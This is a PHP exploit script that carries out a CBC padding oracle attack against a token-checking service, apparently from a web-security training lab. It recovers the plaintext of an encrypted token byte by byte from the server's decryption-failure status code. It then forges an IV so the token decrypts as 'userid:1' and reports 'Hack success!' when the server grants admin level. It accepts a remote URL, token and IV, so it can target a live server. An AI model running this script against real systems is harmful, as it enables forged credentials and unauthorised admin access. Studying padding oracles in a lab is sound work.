<?php

require_once ("token_library_high.php");

function xor_byte_array ($a1, $a2) {
	if (count ($a1) != count ($a2)) {
		throw new Exception ("Arrays are different length");
	}
	$out = [];
	for ($i = 0; $i < count ($a1); $i++) {
		$out[] = $a1[$i] ^ $a2[$i];
	}
	return $out;
}

function byte_array_to_string ($array) {
	$str = "";
	foreach ($array as $c) {
		$str .= "0x" . sprintf ("%02x", $c) . " ";
	}
	return $str;
}

function zero_array($length) {
	$array = [];
	for ($i = 0; $i < $length; $i++) {
		$array[$i] = 0x00;
	}
	return $array;
}

function make_call ($token, $iv, $url = null) {
	# This maps the IV byte array down to a string
	$iv_string = implode(array_map("chr", $iv));

	# Now base64 encode it so it is safe to send
	$iv_string_b64 = base64_encode ($iv_string);

	$data = array (
					"token" => $token,
					"iv" => $iv_string_b64
				);

	if (is_null ($url)) {
		$body = check_token (json_encode ($data));
	} else {
		$ch = curl_init();

		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json', 'Accept:application/json'));
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode ($data));

		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_HEADER, true);

		$response = curl_exec($ch);

		$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		$header = substr($response, 0, $header_size);
		$body = substr($response, $header_size);

		// May return false or something that evaluates to false
		// so can't do strict type check
		if ($response == false) {
			print "Could not access remote server, is the URL correct?
${url}
";
			exit;
		}
		if (strpos ($header, "200 OK") === false) {
			print "Check token script not found, have you got the right URL?
${url}
";
			exit;
		}

		curl_close($ch);
	}

	return json_decode ($body, true);
}

function do_attack ($iv_string_b64, $token, $url) {
	$iv_string = base64_decode ($iv_string_b64);
	$temp_init_iv = unpack('C*', $iv_string);

	# The unpack creates an array starting a 1, the
	# rest of this code assumes an array starting at 0
	# so calling array_values changes the array 0 based

	$init_iv = array_values ($temp_init_iv);

	print "Trying to decrypt\n";
	print "\n";

	$iv = zero_array(16);
	$zeroing = zero_array(16);


	for ($padding = 1; $padding <= 16; $padding++) {
		$offset = 16 - $padding;
		print ("Looking at offset $offset for padding $padding\n");
		for ($i = 0; $i <= 0xff; $i++) {
			$iv[$offset] = $i;
			for ($k = $offset + 1; $k < 16; $k++) {
				$iv[$k] = $zeroing[$k] ^ $padding;
			}
			try {
				$obj = make_call ($token, $iv, $url);

				# 526 is decryption failed
				if ($obj['status'] != 526) {
					print "Got hit for: " . $i . "\n";

					# Only get here if the decrypt works correctly

					/*

					Check for edge case on offset 15 (right most byte).
					The decrypted data could look like this:

					0x44 ... 0x02 0x02
								  ^^^^ Real last byte of value 2 byte padding

					In this situation, if we happen to land on a value 
					that sets the last byte to 0x02 then that will
					look like valid padding as it will make the data end
					in 0x02 0x02 as it already does:

					0x44 ... 0x02 0x02
								  ^^^^ Fluke, we want 0x01 for 1 byte padding

					This is what we want:

					0x44 ... 0x02 0x01
								  ^^^^ Valid 1 byte padding

					To do this, change the IV value for offset 14 which will
					change the second to last byte and make the call again.
					If we were in the edge case we would now have:

					0x44 ... 0xf3 0x02
								  ^^^^ No longer valid padding

					This is no longer valid padding so it will fail and we can 
					continue looking till we find the value that gives us
					valid 1 byte padding.

					*/

					// Used by the edge case check

					$ignore = false;
					if ($offset == 15) {
						print "Got a valid decrypt for offset 15, checking edge case\n";
						$temp_iv = $iv;
						$temp_iv[14] = 0xff;
						$temp_d_obj = make_call ($token, $temp_iv, $url);
						if ($temp_d_obj['status'] != 526) {
							print "Not edge case, can continue\n";
						} else {
							print "Edge case, do not continue\n";
							$ignore = true;
						}
					}
					
					if (!$ignore) {
						print "There was a match\n";
						$zeroing[$offset] = $i ^ $padding; 
						# print "IV: " . byte_array_to_string ($iv) . "\n";
						# print "Zero: " . byte_array_to_string ($zeroing) . "\n";
						break;
					}
				}
			} catch(Exception $exp) {
				# print "Fail\n";
				# var_dump ($e);
			}
		}
	}

	print "\n";
	print "Finished looping\n";
	print "\n";

	print "Derived IV is: " . byte_array_to_string ($iv) . "\n";

	# If you want to check this, it should be all 16 to show it is all padding
	# $x = xor_byte_array ($iv, $zeroing);
	# print "Derived IV XOR and zeroing string: " . byte_array_to_string ($x) . "\n";

	print "Real IV is: " . byte_array_to_string ($init_iv) . "\n";
	print "Zeroing array is: " . byte_array_to_string ($zeroing) . "\n";
	print "\n";

	$x = xor_byte_array ($init_iv, $zeroing);
	print "Decrypted string with padding: " . byte_array_to_string ($x) . "\n";
	$number_of_padding_bytes = $x[15];
	$without_padding = array_slice ($x, 0, 16 - $number_of_padding_bytes);
	print "Decrypted string without padding: " . byte_array_to_string ($without_padding) . "\n";

	$str = '';
	for ($i = 0; $i < count ($without_padding); $i++) {
		$c = $without_padding[$i];
		if ($c > 0x19 && $c < 0x7f) {
			$str .= chr($c);
		} else {
			$str .= "0x" . sprintf ("%02x", $c) . " ";
		}
	}

	print "Decrypted string as text: " . $str . "\n";

	/*
	Trying to modify decrypted data by playing with the zeroing array.
	*/

	print "\n";
	print "Trying to modify string\n";
	print "\n";

	$new_clear = "userid:1";
	print "New clear text: " . $new_clear . "\n";

	for ($i = 0; $i < strlen($new_clear); $i++) {
		$zeroing[$i] = $zeroing[$i] ^ ord($new_clear[$i]);
	}
	$padding = 16 - strlen($new_clear);
	$offset = 16 - $padding;
	for ($i = $offset; $i < 16; $i++) {
		$zeroing[$i] = $zeroing[$i] ^ $padding;
	}

	print "New IV is: " . byte_array_to_string ($zeroing) . "\n";
	print "\n";

	print "Sending new data to server...\n";
	print "\n";

	try {
		$ret_obj = make_call ($token, $zeroing, $url);

		print "Response from server:\n";
		var_dump ($ret_obj);

		if ($ret_obj['status'] == 200 && $ret_obj['level'] == "admin") {
			print "\n";
			print "Hack success!\n\n";
			print "The new token is:\n";

			# This maps the IV byte array down to a string
			$iv_string = implode(array_map("chr", $zeroing));

			# Now base64 encode it so it is safe to send
			$iv_string_b64 = base64_encode ($iv_string);

			$new_token = array (
								"token" => $token,
								"iv" => $iv_string_b64
							);
			print json_encode ($new_token);
			print "\n\n";
		} else {
			print "Hack failed\n";
		}
	} catch (Exception $exp) {
		print "Hack failed, system could not decrypt message\n";
		var_dump ($exp);
	}
}

$shortopts  = "";
$shortopts .= "h";  // Help

$longopts  = array(
"url:",    // Required value
"iv:",     // Required value
"token:",  // Required value
"local",   // No value
"help",    // No value
);
$options = getopt($shortopts, $longopts);

if (array_key_exists ("h", $options) || array_key_exists ("help", $options)) {
	print "This script can either test against a local decryptor or a remote.\n
To test locally, pass --local, otherwise pass the IV, token and URL for the remote system.

--local - Test locally
--iv - IV from remote system
--token - Token from remote system
--url - URL for the check function
-h, --help - help

";
	exit;
} elseif (array_key_exists ("l", $options) || array_key_exists ("local", $options)) {
	print "Creating the token locally\n\n";

	$token_data = json_decode (create_token(true), true);

	$token = $token_data['token'];
	$iv = $token_data['iv'];
	$url = null;
} elseif (array_key_exists ("iv", $options) &&
	array_key_exists ("token", $options) &&
	array_key_exists ("url", $options)) {
	print "Attacking remote server using parameters provided\n\n";

	$token = $options['token'];
	$iv = $options['iv'];
	$url = $options['url'];
} else {
	print "Either specify --local or provide the IV, token and URL\n\n";
	exit;
}

do_attack ($iv, $token, $url);
